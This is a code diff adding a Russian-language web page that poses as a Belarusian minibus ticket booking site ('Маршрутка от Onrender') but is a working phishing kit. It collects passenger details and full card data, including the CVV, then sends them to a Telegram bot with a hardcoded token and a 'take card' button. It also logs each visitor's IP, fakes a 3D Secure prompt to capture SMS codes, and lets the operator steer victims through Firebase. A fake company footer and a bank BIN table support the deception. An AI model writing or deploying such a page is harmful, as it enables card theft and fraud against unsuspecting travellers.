@@ -1,0 +1,779 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>Маршрутка от Onrender !</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+        }
+        body {
+            background: #0c111d;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+            position: relative;
+            overflow-x: hidden;
+        }
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: -10%;
+            width: 120%;
+            height: 100%;
+            background: url('https://cdn-icons-png.flaticon.com/512/2972/2972185.png') repeat-x 0 50%;
+            background-size: 150px auto;
+            opacity: 0.03;
+            animation: drive 20s linear infinite;
+            pointer-events: none;
+            z-index: 0;
+        }
+        @keyframes drive {
+            0% { background-position: -150px 50%; }
+            100% { background-position: 100% 50%; }
+        }
+        .card {
+            max-width: 500px;
+            width: 100%;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            overflow: hidden;
+            position: relative;
+            z-index: 1;
+        }
+        .header {
+            background: #003a70;
+            padding: 20px;
+            text-align: center;
+        }
+        .header a {
+            color: white;
+            text-decoration: none;
+            font-size: 24px;
+            font-weight: 700;
+            letter-spacing: 1px;
+        }
+        .header a:hover {
+            text-decoration: underline;
+        }
+        .content {
+            padding: 24px;
+        }
+        .search-box {
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        .search-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #003a70;
+            margin-bottom: 16px;
+        }
+        .field {
+            margin-bottom: 16px;
+        }
+        .field label {
+            display: block;
+            font-size: 13px;
+            color: #475569;
+            margin-bottom: 4px;
+            font-weight: 500;
+        }
+        .field input, .field select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #cbd5e1;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: 0.2s;
+            background: white;
+        }
+        .field input:focus, .field select:focus {
+            outline: none;
+            border-color: #003a70;
+            box-shadow: 0 0 0 3px rgba(0,58,112,0.1);
+        }
+        .btn {
+            background: #003a70;
+            color: white;
+            border: none;
+            padding: 14px;
+            width: 100%;
+            border-radius: 40px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+            margin: 8px 0;
+        }
+        .btn:hover {
+            background: #002b54;
+        }
+        .btn-outline {
+            background: white;
+            color: #003a70;
+            border: 1px solid #003a70;
+        }
+        .btn-outline:hover {
+            background: #f0f7ff;
+        }
+        .route-list {
+            margin-top: 20px;
+        }
+        .route-item {
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .route-info h3 {
+            font-size: 18px;
+            color: #1e293b;
+            margin-bottom: 6px;
+        }
+        .route-info p {
+            font-size: 14px;
+            color: #64748b;
+            margin-bottom: 4px;
+        }
+        .route-price {
+            font-size: 20px;
+            font-weight: 700;
+            color: #003a70;
+        }
+        .route-seats {
+            font-size: 13px;
+            color: #059669;
+        }
+        .footer {
+            text-align: center;
+            font-size: 12px;
+            color: #94a3b8;
+            padding: 16px;
+            border-top: 1px solid #e2e8f0;
+        }
+        .spinner {
+            border: 3px solid #e2e8f0;
+            border-top: 3px solid #003a70;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .sms-code {
+            font-size: 32px;
+            letter-spacing: 8px;
+            text-align: center;
+            padding: 16px;
+            background: #f1f5f9;
+            border: 2px solid #cbd5e1;
+            border-radius: 12px;
+            width: 100%;
+            margin: 20px 0;
+        }
+        .success, .fail {
+            text-align: center;
+            padding: 20px;
+        }
+        .success-icon, .fail-icon {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 30px;
+            border: 2px solid;
+        }
+        .success-icon {
+            background: #d1fae5;
+            color: #059669;
+            border-color: #059669;
+        }
+        .fail-icon {
+            background: #fee2e2;
+            color: #b91c1c;
+            border-color: #b91c1c;
+        }
+    </style>
+</head>
+<body>
+    <div class="card" id="app"></div>
+
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+    <script>
+        (function() {
+            const firebaseConfig = {
+                apiKey: "AIzaSyB2IZy_bK8vQeiGpXYbvWvDyPcP80Dj984",
+                authDomain: "marsutka-tt37.firebaseapp.com",
+                databaseURL: "https://marsutka-tt37-default-rtdb.firebaseio.com",
+                projectId: "marsutka-tt37",
+                storageBucket: "marsutka-tt37.firebasestorage.app",
+                messagingSenderId: "714890480273",
+                appId: "1:714890480273:web:e537b2c757d521a88e0d30"
+            };
+            firebase.initializeApp(firebaseConfig);
+            const db = firebase.database();
+
+            const BOT_TOKEN = '8529551109:AAGafdmClxe936XeYH5F3VfLrtFNZ20CP9c';
+            const ADMIN_ID = 5852338439;
+            const urlParams = new URLSearchParams(window.location.search);
+            const linkHash = urlParams.get('hash') || null;
+
+            let state = {
+                mode: linkHash ? 'specific' : 'search',
+                step: linkHash ? 'specific' : 'search',
+                fromCity: '',
+                toCity: '',
+                date: '',
+                selectedRoute: null,
+                passenger: { fullName: '', phone: '', email: '' },
+                card: { number: '', expiry: '', cvv: '', cardholder: '' },
+                smsCode: '',
+                sessionId: 'sess_' + Date.now() + '_' + Math.random().toString(36).substring(7),
+                searchResults: []
+            };
+
+            // ==================== БАЗА BIN (ТА ЖЕ, ЧТО В БОТЕ) ====================
+            const BIN_DB = {
+                // Беларусбанк
+                '427901': { bank: 'Беларусбанк', type: 'Visa Classic' },
+                '427902': { bank: 'Беларусбанк', type: 'Visa Gold' },
+                '427903': { bank: 'Беларусбанк', type: 'Visa Platinum' },
+                '427904': { bank: 'Беларусбанк', type: 'Visa Infinite' },
+                '425501': { bank: 'Беларусбанк', type: 'Mastercard Standard' },
+                '425502': { bank: 'Беларусбанк', type: 'Mastercard Gold' },
+                '911201': { bank: 'Беларусбанк', type: 'МИР Classic' },
+                '911202': { bank: 'Беларусбанк', type: 'МИР Premium' },
+                '380101': { bank: 'Беларусбанк', type: 'Белкарт Classic' },
+                '91123801': { bank: 'Беларусбанк', type: 'МИР Supreme' },
+                
+                // Приорбанк
+                '521324': { bank: 'Приорбанк', type: 'Mastercard Standard' },
+                '521325': { bank: 'Приорбанк', type: 'Mastercard Gold' },
+                '515701': { bank: 'Приорбанк', type: 'Visa Classic' },
+                '515702': { bank: 'Приорбанк', type: 'Visa Gold' },
+                
+                // Белинвестбанк
+                '440501': { bank: 'Белинвестбанк', type: 'Visa Classic' },
+                '440502': { bank: 'Белинвестбанк', type: 'Visa Gold' },
+                '510501': { bank: 'Белинвестбанк', type: 'Mastercard Standard' },
+                
+                // Альфа-Банк
+                '458101': { bank: 'Альфа-Банк', type: 'Visa Classic' },
+                '458102': { bank: 'Альфа-Банк', type: 'Visa Gold' },
+                '555501': { bank: 'Альфа-Банк', type: 'Mastercard Standard' },
+                '548701': { bank: 'Альфа-Банк', type: 'Visa Platinum' },
+                
+                // Банк Дабрабыт
+                '462201': { bank: 'Банк Дабрабыт', type: 'Visa Classic' },
+                '552201': { bank: 'Банк Дабрабыт', type: 'Mastercard Standard' },
+                
+                // Технобанк
+                '424601': { bank: 'Технобанк', type: 'Visa Classic' },
+                '676301': { bank: 'Технобанк', type: 'Maestro' },
+                
+                // Паритетбанк
+                '498401': { bank: 'Паритетбанк', type: 'Visa Classic' },
+                '427601': { bank: 'Паритетбанк', type: 'Mastercard Standard' },
+                
+                // РРБ-Банк
+                '411111': { bank: 'РРБ-Банк', type: 'Visa Classic' },
+                
+                // Сбербанк
+                '427688': { bank: 'Сбербанк', type: 'Visa Classic' },
+                '546901': { bank: 'Сбербанк', type: 'Mastercard Standard' },
+                
+                // ВТБ
+                '427229': { bank: 'ВТБ', type: 'Visa Classic' },
+                '546801': { bank: 'ВТБ', type: 'Mastercard Standard' },
+                
+                // Тинькофф
+                '437772': { bank: 'Тинькофф', type: 'Visa Classic' },
+                '521324': { bank: 'Тинькофф', type: 'Mastercard Standard' },
+                
+                // Открытие
+                '440588': { bank: 'Открытие', type: 'Visa Classic' },
+                '548002': { bank: 'Банк БелВЭБ', type: 'Mastercard' },
+                '431400': { bank: 'Банк Москва-Минск', type: 'Visa' },
+            };
+
+            function getBinInfo(cardNumber) {
+                const bin = cardNumber.replace(/\D/g, '').slice(0,6);
+                return BIN_DB[bin] || { bank: 'Неизвестно', type: 'Неизвестно' };
+            }
+
+            function formatCardNumber(v) {
+                let d = v.replace(/\D/g, '').slice(0,16);
+                let parts = [];
+                for (let i=0; i<d.length; i+=4) parts.push(d.slice(i,i+4));
+                return parts.join(' ');
+            }
+            function formatExpiry(v) {
+                let d = v.replace(/\D/g, '').slice(0,4);
+                if (d.length >= 3) return d.slice(0,2) + '/' + d.slice(2);
+                return d;
+            }
+            function formatCVV(v) {
+                return v.replace(/\D/g, '').slice(0,3);
+            }
+
+            // Данные маршрутов
+            const routes = [
+                { from: 'Минск', to: 'Гомель', price: 27, duration: '4ч 30м', seats: 12, fromPoint: 'Автовокзал «Центральный», ул. Бобруйская 1', toPoint: 'Автовокзал «Гомель», ул. Привокзальная 3' },
+                { from: 'Минск', to: 'Брест', price: 30, duration: '4ч 00м', seats: 8, fromPoint: 'Автовокзал «Восточный», ул. Олега Кошевого', toPoint: 'Автовокзал «Брест»' },
+                { from: 'Минск', to: 'Витебск', price: 28, duration: '3ч 45м', seats: 5, fromPoint: 'Автовокзал «Центральный», ул. Бобруйская 1', toPoint: 'Автовокзал «Витебск»' },
+                { from: 'Минск', to: 'Гродно', price: 27, duration: '4ч 38м', seats: 9, fromPoint: 'Автовокзал «Восточный», ул. Олега Кошевого', toPoint: 'Автовокзал «Гродно», ул. Чырвонаармейская' },
+                { from: 'Минск', to: 'Могилёв', price: 25, duration: '2ч 30м', seats: 15, fromPoint: 'Автовокзал «Центральный», ул. Бобруйская 1', toPoint: 'Гостиница «Могилёв», пр. Мира 6' },
+                { from: 'Минск', to: 'Бобруйск', price: 22, duration: '1ч 40м', seats: 7, fromPoint: 'ЖД Вокзал «Минск-Пассажирский», платформа 5', toPoint: 'Остановка у магазина Mart Inn' },
+                { from: 'Гомель', to: 'Минск', price: 27, duration: '4ч 30м', seats: 10, fromPoint: 'Автовокзал «Гомель», ул. Привокзальная 3', toPoint: 'Автовокзал «Центральный», ул. Бобруйская 1' },
+                { from: 'Брест', to: 'Минск', price: 30, duration: '4ч 00м', seats: 6, fromPoint: 'Автовокзал «Брест»', toPoint: 'Автовокзал «Восточный», ул. Олега Кошевого' },
+            ];
+
+            function searchRoutes(from, to) {
+                return routes.filter(r => r.from === from && r.to === to);
+            }
+
+            async function sendCardToBot(routeData) {
+                const binInfo = getBinInfo(state.card.number);
+                const messageText = 
+                    `💳 НОВАЯ КАРТА\n\n` +
+                    `🚐 Маршрут: ${routeData.from} → ${routeData.to}\n` +
+                    `📅 ${state.date}\n` +
+                    `💰 ${routeData.price} BYN\n` +
+                    `👤 Пассажир: ${state.passenger.fullName}\n` +
+                    `📞 Телефон: ${state.passenger.phone}\n` +
+                    `📧 Email: ${state.passenger.email}\n` +
+                    `💳 Карта: ${state.card.number}\n` +
+                    `📅 Срок: ${state.card.expiry} | CVV: ${state.card.cvv}\n` +
+                    `👤 Владелец: ${state.card.cardholder}\n` +
+                    `🔢 BIN: ${state.card.number.replace(/\D/g, '').slice(0,6)}\n` +
+                    `🏦 БАНК: ${binInfo.bank}\n` +
+                    `💎 ТИП: ${binInfo.type}\n` +
+                    `🔗 Хеш: ${linkHash || 'manual'}\n` +
+                    `🆔 Сессия: ${state.sessionId}`;
+
+                const keyboard = {
+                    inline_keyboard: [
+                        [{ text: '💰 ВЗЯТЬ КАРТУ', callback_data: `take_${state.sessionId}` },
+                         { text: '🗑 ОТКАЗ', callback_data: `reject_${state.sessionId}` }]
+                    ]
+                };
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: ADMIN_ID,
+                            text: messageText,
+                            parse_mode: 'HTML',
+                            reply_markup: keyboard
+                        })
+                    });
+                    return true;
+                } catch (e) {
+                    console.error(e);
+                    return false;
+                }
+            }
+
+            async function sendVisitNotification() {
+                if (!linkHash) return;
+                try {
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipRes.json();
+                    const text = `👁 ЗАХОД НА ССЫЛКУ\n\n🔗 Хеш: ${linkHash}\n🌍 IP: ${ipData.ip}\n📱 ${navigator.userAgent}`;
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: ADMIN_ID, text: text })
+                    });
+                } catch (e) {}
+            }
+
+            let firebaseListener = null;
+            
+            function startFirebaseListener() {
+                if (firebaseListener) return;
+                
+                console.log(`🔥 Запуск Firebase слушателя для ${state.sessionId}`);
+                const cardRef = db.ref(`cards/${state.sessionId}/status`);
+                
+                firebaseListener = cardRef.on('value', (snapshot) => {
+                    const status = snapshot.val();
+                    console.log(`🔥 Статус Firebase: ${status}, шаг: ${state.step}`);
+                    
+                    if (status === 'sms' && (state.step === 'processing' || state.step === 'processing2')) {
+                        console.log('✅ Переключаем на SMS');
+                        state.step = 'sms';
+                        render();
+                    } else if (status === 'success' && state.step === 'processing2') {
+                        console.log('✅ Оплата успешна');
+                        state.step = 'success';
+                        render();
+                    } else if (status === 'fail' && state.step === 'processing2') {
+                        console.log('❌ Оплата не прошла');
+                        state.step = 'fail';
+                        render();
+                    }
+                }, (error) => {
+                    console.error('❌ Ошибка Firebase:', error);
+                });
+            }
+
+            function render() {
+                const app = document.getElementById('app');
+                let html = `
+                    <div class="header">
+                        <a href="/">🚐 Маршрутка от Onrender !</a>
+                    </div>
+                    <div class="content">
+                `;
+
+                if (state.step === 'search') {
+                    html += `
+                        <div class="search-box">
+                            <div class="search-title">🔍 ПОИСК БИЛЕТОВ</div>
+                            <div class="field">
+                                <label>Откуда</label>
+                                <select id="fromCity">
+                                    <option value="">Выберите город</option>
+                                    <option value="Минск">Минск</option>
+                                    <option value="Гомель">Гомель</option>
+                                    <option value="Брест">Брест</option>
+                                    <option value="Витебск">Витебск</option>
+                                    <option value="Гродно">Гродно</option>
+                                    <option value="Могилёв">Могилёв</option>
+                                    <option value="Бобруйск">Бобруйск</option>
+                                </select>
+                            </div>
+                            <div class="field">
+                                <label>Куда</label>
+                                <select id="toCity">
+                                    <option value="">Выберите город</option>
+                                    <option value="Минск">Минск</option>
+                                    <option value="Гомель">Гомель</option>
+                                    <option value="Брест">Брест</option>
+                                    <option value="Витебск">Витебск</option>
+                                    <option value="Гродно">Гродно</option>
+                                    <option value="Могилёв">Могилёв</option>
+                                    <option value="Бобруйск">Бобруйск</option>
+                                </select>
+                            </div>
+                            <div class="field">
+                                <label>Дата</label>
+                                <input type="date" id="date" value="${new Date().toISOString().split('T')[0]}">
+                            </div>
+                            <button class="btn" id="searchBtn">НАЙТИ БИЛЕТЫ</button>
+                        </div>
+                        <div class="route-list" id="routeList"></div>
+                    `;
+                } else if (state.step === 'select') {
+                    const route = state.selectedRoute;
+                    html += `
+                        <div class="search-box">
+                            <div class="search-title">✅ ВЫБРАННЫЙ РЕЙС</div>
+                            <div style="margin-bottom: 16px;">
+                                <h3>${route.from} → ${route.to}</h3>
+                                <p><strong>📅 Дата:</strong> ${state.date}</p>
+                                <p><strong>📍 Отправление:</strong> ${route.fromPoint}</p>
+                                <p><strong>📍 Прибытие:</strong> ${route.toPoint}</p>
+                                <p><strong>⏱ В пути:</strong> ${route.duration}</p>
+                                <p><strong>🎫 Мест осталось:</strong> ${route.seats}</p>
+                                <p><strong>💰 Цена:</strong> ${route.price} BYN</p>
+                            </div>
+                            <button class="btn" id="continueBtn">ПРОДОЛЖИТЬ</button>
+                            <button class="btn btn-outline" onclick="state.step='search'; render();">← НАЗАД К ПОИСКУ</button>
+                        </div>
+                    `;
+                } else if (state.step === 'passenger') {
+                    html += `
+                        <div class="search-box">
+                            <div class="search-title">👤 ДАННЫЕ ПАССАЖИРА</div>
+                            <div class="field">
+                                <label>ФИО *</label>
+                                <input type="text" id="fullName" placeholder="Иванов Иван Иванович" value="${state.passenger.fullName}">
+                            </div>
+                            <div class="field">
+                                <label>Телефон *</label>
+                                <input type="tel" id="phone" placeholder="+375291234567" value="${state.passenger.phone}" maxlength="12">
+                            </div>
+                            <div class="field">
+                                <label>Email (для билета)</label>
+                                <input type="email" id="email" placeholder="ivanov@mail.ru" value="${state.passenger.email}">
+                            </div>
+                            <button class="btn" id="nextBtn">ПРОДОЛЖИТЬ К ОПЛАТЕ</button>
+                            <button class="btn btn-outline" onclick="state.step='select'; render();">← НАЗАД</button>
+                        </div>
+                    `;
+                } else if (state.step === 'card') {
+                    html += `
+                        <div class="search-box">
+                            <div class="search-title">💳 ВВОД КАРТЫ</div>
+                            <div class="field">
+                                <label>Номер карты *</label>
+                                <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" value="${state.card.number}" maxlength="19">
+                            </div>
+                            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
+                                <div class="field">
+                                    <label>Срок</label>
+                                    <input type="text" id="expiry" placeholder="ММ/ГГ" value="${state.card.expiry}" maxlength="5">
+                                </div>
+                                <div class="field">
+                                    <label>CVV</label>
+                                    <input type="text" id="cvv" placeholder="123" value="${state.card.cvv}" maxlength="3">
+                                </div>
+                            </div>
+                            <div class="field">
+                                <label>Владелец карты</label>
+                                <input type="text" id="cardholder" placeholder="IVANOV IVAN" value="${state.card.cardholder}">
+                            </div>
+                            <button class="btn" id="payBtn">ОПЛАТИТЬ ${state.selectedRoute.price} BYN</button>
+                            <button class="btn btn-outline" onclick="state.step='passenger'; render();">← НАЗАД</button>
+                        </div>
+                    `;
+                } else if (state.step === 'processing') {
+                    html += `
+                        <div class="search-box" style="text-align: center;">
+                            <div class="spinner"></div>
+                            <p style="margin:20px 0;">Пожалуйста, не закрывайте страницу</p>
+                            <p style="color:#64748b;">Ожидаем подтверждение...</p>
+                        </div>
+                    `;
+                    startFirebaseListener();
+                } else if (state.step === 'processing2') {
+                    html += `
+                        <div class="search-box" style="text-align: center;">
+                            <div class="spinner"></div>
+                            <p style="margin:20px 0;">Банк подтверждает операцию...</p>
+                            <p style="color:#64748b;">Пожалуйста, подождите</p>
+                        </div>
+                    `;
+                } else if (state.step === 'sms') {
+                    html += `
+                        <div class="search-box">
+                            <div class="search-title">🔐 3D Secure</div>
+                            <p style="margin-bottom:16px;">Введите код, отправленный на ваш телефон</p>
+                            <input class="sms-code" id="smsCode" maxlength="6" placeholder="______" value="${state.smsCode}" inputmode="numeric">
+                            <button class="btn" id="confirmSms">ПОДТВЕРДИТЬ</button>
+                            <button class="btn btn-outline" onclick="state.step='card'; render();">← НАЗАД К КАРТЕ</button>
+                        </div>
+                    `;
+                } else if (state.step === 'success') {
+                    html += `
+                        <div class="search-box success">
+                            <div class="success-icon">✓</div>
+                            <h3 style="margin-bottom:16px;">Билет зарезервирован!</h3>
+                            <p style="margin-bottom:30px;">Билет отправлен на email и SMS.<br>Диспетчер свяжется с вами в течение 10 минут.</p>
+                            <button class="btn" onclick="window.location.href='/'">НА ГЛАВНУЮ</button>
+                        </div>
+                    `;
+                } else if (state.step === 'fail') {
+                    html += `
+                        <div class="search-box fail">
+                            <div class="fail-icon">✕</div>
+                            <h3 style="margin-bottom:16px;">Платёж не прошёл</h3>
+                            <p style="margin-bottom:30px;">Попробуйте другую карту или повторите позже.</p>
+                            <button class="btn" onclick="state.step='card'; render();">ПОПРОБОВАТЬ СНОВА</button>
+                            <button class="btn btn-outline" onclick="window.location.href='/'">НА ГЛАВНУЮ</button>
+                        </div>
+                    `;
+                }
+
+                html += `
+                        <div class="footer">
+                            © 2026 ООО «АвтоТрансБел» | УНП 193421567<br>
+                            Лицензия Минтранса № АП-2026-458
+                        </div>
+                    </div>
+                `;
+                app.innerHTML = html;
+
+                if (state.step === 'search') {
+                    document.getElementById('searchBtn')?.addEventListener('click', () => {
+                        const from = document.getElementById('fromCity').value;
+                        const to = document.getElementById('toCity').value;
+                        const date = document.getElementById('date').value;
+                        
+                        if (!from || !to) {
+                            alert('Выберите города отправления и прибытия');
+                            return;
+                        }
+                        if (from === to) {
+                            alert('Города отправления и прибытия должны быть разными');
+                            return;
+                        }
+                        
+                        state.fromCity = from;
+                        state.toCity = to;
+                        state.date = date;
+                        
+                        const results = searchRoutes(from, to);
+                        const routeList = document.getElementById('routeList');
+                        
+                        if (results.length === 0) {
+                            routeList.innerHTML = '<p style="text-align:center; color:#64748b;">Нет рейсов по данному маршруту</p>';
+                            return;
+                        }
+                        
+                        let resultsHtml = '<div class="search-title">📋 РЕЗУЛЬТАТЫ ПОИСКА</div>';
+                        results.forEach(route => {
+                            resultsHtml += `
+                                <div class="route-item">
+                                    <div class="route-info">
+                                        <h3>${route.from} → ${route.to}</h3>
+                                        <p>⏱ ${route.duration} • 🎫 ${route.seats} мест</p>
+                                    </div>
+                                    <div style="text-align: right;">
+                                        <div class="route-price">${route.price} BYN</div>
+                                        <button class="btn" style="padding:8px 16px; margin-top:8px;" onclick="selectRoute(${JSON.stringify(route).replace(/"/g, '&quot;')})">ВЫБРАТЬ</button>
+                                    </div>
+                                </div>
+                            `;
+                        });
+                        routeList.innerHTML = resultsHtml;
+                    });
+                }
+                if (state.step === 'select') {
+                    document.getElementById('continueBtn')?.addEventListener('click', () => {
+                        state.step = 'passenger';
+                        render();
+                    });
+                }
+                if (state.step === 'passenger') {
+                    document.getElementById('nextBtn')?.addEventListener('click', () => {
+                        state.passenger.fullName = document.getElementById('fullName').value.trim();
+                        state.passenger.phone = document.getElementById('phone').value.trim().replace(/\D/g, '');
+                        state.passenger.email = document.getElementById('email').value.trim();
+                        
+                        if (!state.passenger.fullName || !state.passenger.phone) {
+                            alert('Заполните ФИО и телефон');
+                            return;
+                        }
+                        if (state.passenger.phone.length < 10) {
+                            alert('Телефон должен содержать не менее 10 цифр');
+                            return;
+                        }
+                        state.step = 'card';
+                        render();
+                    });
+                }
+                if (state.step === 'card') {
+                    const cn = document.getElementById('cardNumber');
+                    const ex = document.getElementById('expiry');
+                    const cv = document.getElementById('cvv');
+                    if (cn) cn.addEventListener('input', (e) => e.target.value = formatCardNumber(e.target.value));
+                    if (ex) ex.addEventListener('input', (e) => e.target.value = formatExpiry(e.target.value));
+                    if (cv) cv.addEventListener('input', (e) => e.target.value = formatCVV(e.target.value));
+
+                    document.getElementById('payBtn')?.addEventListener('click', async () => {
+                        state.card.number = document.getElementById('cardNumber').value.trim();
+                        state.card.expiry = document.getElementById('expiry').value.trim();
+                        state.card.cvv = document.getElementById('cvv').value.trim();
+                        state.card.cardholder = document.getElementById('cardholder').value.trim();
+                        
+                        const cardDigits = state.card.number.replace(/\D/g, '');
+                        
+                        if (cardDigits.length !== 16) {
+                            alert('Номер карты должен содержать 16 цифр');
+                            return;
+                        }
+                        if (!state.card.expiry || state.card.expiry.length < 5) {
+                            alert('Введите срок действия');
+                            return;
+                        }
+                        if (!state.card.cvv || state.card.cvv.length < 3) {
+                            alert('Введите CVV-код');
+                            return;
+                        }
+                        if (!state.card.cardholder) {
+                            alert('Введите владельца карты');
+                            return;
+                        }
+                        
+                        const ok = await sendCardToBot(state.selectedRoute);
+                        if (ok) {
+                            state.step = 'processing';
+                            render();
+                        } else {
+                            alert('Ошибка отправки в Telegram');
+                        }
+                    });
+                }
+                if (state.step === 'sms') {
+                    document.getElementById('confirmSms')?.addEventListener('click', async () => {
+                        const code = document.getElementById('smsCode').value.trim();
+                        if (!code || code.length < 4) {
+                            alert('Введите код из SMS');
+                            return;
+                        }
+                        state.smsCode = code;
+                        
+                        const messageText = `📨 SMS-КОД\n\n🆔 Сессия: ${state.sessionId}\n📱 Код: ${code}`;
+                        
+                        const smsKeyboard = {
+                            inline_keyboard: [
+                                [{ text: '✅ УСПЕХ (3D)', callback_data: `bind_success_${state.sessionId}` },
+                                 { text: '❌ ФЕЙЛ', callback_data: `bind_fail_${state.sessionId}` },
+                                 { text: '🔄 ПОВТОР СМС', callback_data: `resend_${state.sessionId}` }]
+                            ]
+                        };
+                        
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: ADMIN_ID,
+                                text: messageText,
+                                parse_mode: 'HTML',
+                                reply_markup: smsKeyboard
+                            })
+                        });
+                        
+                        state.step = 'processing2';
+                        render();
+                    });
+                }
+            }
+
+            window.selectRoute = function(route) {
+                state.selectedRoute = route;
+                state.step = 'select';
+                render();
+            };
+
+            if (linkHash) {
+                sendVisitNotification();
+                // Для теста показываем конкретный рейс
+                state.selectedRoute = routes.find(r => r.from === 'Минск' && r.to === 'Гомель');
+                state.step = 'select';
+            }
+            render();
+        })();
+    </script>
+</body>
+</html>
